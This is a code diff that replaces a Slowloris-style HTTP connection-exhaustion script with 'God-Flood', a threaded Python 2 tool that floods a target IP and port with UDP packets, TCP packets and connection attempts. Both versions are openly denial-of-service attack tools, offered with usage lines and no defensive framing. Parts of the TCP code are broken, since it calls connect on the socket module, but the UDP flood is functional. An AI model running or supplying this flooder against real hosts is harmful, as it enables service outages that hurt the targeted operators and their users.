@@ -1,66 +1,79 @@
-#usr/bin/env python
+#!/usr/bin/env python
+#God-Flood(tcp,syn,udp) by LiGhT
+import threading, sys, time, random, socket
 
-import sys
-import random
-import socket
-import time
-from progress.bar import Bar
+if len(sys.argv) < 4:
+    print "God-Flood By LiGhT"
+    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
 
-regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-                    "Accept-language: en-US,en,q=0.5"]
+ip = sys.argv[1]
+port = int(sys.argv[2])
+size = int(sys.argv[3])
+packets = int(sys.argv[3])
 
-def init_socket(ip,port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-    s.connect((ip,int(port)))
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
-
-    for header in regular_headers:
-        s.send('{}\r\n'.format(header).encode('UTF-8'))
-
-    return s
-
-def main():
-    if len(sys.argv)<5:
-        print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
-        return
-
-    ip = sys.argv[1]
-    port = sys.argv[2]
-    socket_count= int(sys.argv[3])
-    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
-    timer = int(sys.argv[4])
-    socket_list=[]
-
-    for _ in range(int(socket_count)):
-        try:
-            s=init_socket(ip,port)
-        except socket.error:
-            break
-        socket_list.append(s)
-        next(bar)
-
-    bar.finish()
-
-    while True:
-        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
-
-        for s in socket_list:
+class syn(threading.Thread):
+    def __init__(self, ip, port, packets):
+        self.ip = ip
+        self.port = port
+        self.packets = packets
+        self.syn = socket.socket()
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
             try:
-                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
-            except socket.error:
-                socket_list.remove(s)
+                self.syn.connect((self.ip, self.port))
+            except:
+                pass
 
-        for _ in range(socket_count - len(socket_list)):
-            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
+class tcp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
             try:
-                s=init_socket(ip,port)
-                if s:
-                    socket_list.append(s)
-            except socket.error:
-                break
+                bytes = random._urandom(self.size)
+                socket.connect(self.ip, self.port)
+                socket.setblocking(0)
+                socket.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
 
-        time.sleep(timer)
+class udp(threading.Thread):
+    def __init__(self, ip, port, size, packets):
+        self.ip = ip
+        self.port = port
+        self.size = size
+        self.packets = packets
+        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        threading.Thread.__init__(self)
+    def run(self):
+        for i in range(self.packets):
+            try:
+                bytes = random._urandom(self.size)
+                if self.port == 0:
+                    self.port = random.randrange(1, 65535)
+                self.udp.sendto(bytes,(self.ip, self.port))
+            except:
+                pass
 
-if __name__=="__main__":
-    main()
+while True:
+    try:
+        if size > 65507:
+            sys.exit("Invalid Number Of Packets!")
+        u = udp(ip,port,size,packets)
+        t = tcp(ip,port,size,packets)
+        s = syn(ip,port,packets)
+        u.start()
+        t.start()
+        s.start()
+    except KeyboardInterrupt:
+        print "Stopping Flood!"
+        sys.exit()
+    except socket.error, msg:
+        print "Socket Couldn't Connect"
+        sys.exit()
